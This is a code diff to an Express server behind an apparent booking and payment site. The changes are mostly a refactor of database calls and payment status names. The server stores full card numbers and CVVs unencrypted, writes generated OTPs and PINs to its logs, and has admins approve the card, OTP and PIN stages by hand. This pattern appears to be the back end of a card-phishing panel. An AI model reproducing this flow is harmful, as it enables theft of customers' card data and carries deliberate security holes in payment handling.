@@ -2,7 +2,7 @@ import express, { Request, Response } from "express";
 import { createServer } from "http";
 import path from "path";
 import { fileURLToPath } from "url";
-import * as db from "./db";
+import { db } from "./db";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -49,7 +49,7 @@ async function startServer() {
       }
 
       const bookingId = generateId();
-      const booking = await db.createBooking({
+      const booking = db.createBooking({
         id: bookingId,
         customerName,
         customerEmail,
@@ -60,6 +60,8 @@ async function startServer() {
         serviceTime,
         totalAmount: parseFloat(totalAmount),
         notes,
+        createdAt: new Date(),
+        status: 'pending',
       });
 
       console.log(`[BOOKING] New booking created: ${bookingId} for ${customerEmail}`);
@@ -89,7 +91,7 @@ async function startServer() {
       const paymentId = generateId();
       const otp = generateOTP();
 
-      await db.createPayment({
+      db.createPayment({
         id: paymentId,
         bookingId: bookingId || '',
         email,
@@ -98,6 +100,9 @@ async function startServer() {
         expiryDate,
         cvv,
         otp,
+        pin: '',
+        status: 'pending',
+        createdAt: new Date(),
       });
 
       console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);
@@ -122,7 +127,7 @@ async function startServer() {
         return res.status(400).json({ error: "Missing OTP, email, or payment ID" });
       }
 
-      const payment = await db.getPaymentById(paymentId);
+      const payment = db.getPaymentById(paymentId);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
@@ -133,7 +138,7 @@ async function startServer() {
       }
 
       const pin = Math.floor(1000 + Math.random() * 9000).toString();
-      await db.updatePaymentPIN(paymentId, pin);
+      db.updatePaymentPIN(paymentId, pin);
 
       console.log(`[PAYMENT] OTP verified for ${email}. PIN: ${pin}`);
 
@@ -156,7 +161,7 @@ async function startServer() {
         return res.status(400).json({ error: "Missing PIN, email, or payment ID" });
       }
 
-      const payment = await db.getPaymentById(paymentId);
+      const payment = db.getPaymentById(paymentId);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
@@ -197,20 +202,20 @@ async function startServer() {
   app.post("/api/admin/payments/:id/approve", async (req: Request, res: Response) => {
     try {
       const { id } = req.params;
-      const payment = await db.getPaymentById(id);
+      const payment = db.getPaymentById(id);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
       }
 
-      if (payment.status === 'pending_card') {
-        await db.updatePaymentStatus(id, 'pending_otp');
+      if (payment.status === 'pending') {
+        db.updatePaymentStatus(id, 'verified_card');
         console.log(`[ADMIN] Card approved for ${payment.email}`);
-      } else if (payment.status === 'pending_otp') {
-        await db.updatePaymentStatus(id, 'pending_pin');
+      } else if (payment.status === 'verified_card') {
+        db.updatePaymentStatus(id, 'verified_otp');
         console.log(`[ADMIN] OTP approved for ${payment.email}`);
-      } else if (payment.status === 'pending_pin') {
-        await db.completePayment(id);
+      } else if (payment.status === 'verified_otp') {
+        db.completePayment(id);
         console.log(`[ADMIN] PIN approved for ${payment.email}`);
       }
 
@@ -228,13 +233,13 @@ async function startServer() {
   app.post("/api/admin/payments/:id/reject", async (req: Request, res: Response) => {
     try {
       const { id } = req.params;
-      const payment = await db.getPaymentById(id);
+      const payment = db.getPaymentById(id);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
       }
 
-      await db.rejectPayment(id);
+      db.rejectPayment(id);
       console.log(`[ADMIN] Payment rejected for ${payment.email}`);
 
       res.json({ 
@@ -250,7 +255,7 @@ async function startServer() {
   // Get statistics
   app.get("/api/admin/statistics", async (req: Request, res: Response) => {
     try {
-      const stats = await db.getStatistics();
+      const stats = db.getStatistics();
       res.json(stats);
     } catch (error) {
       console.error("Error fetching statistics:", error);
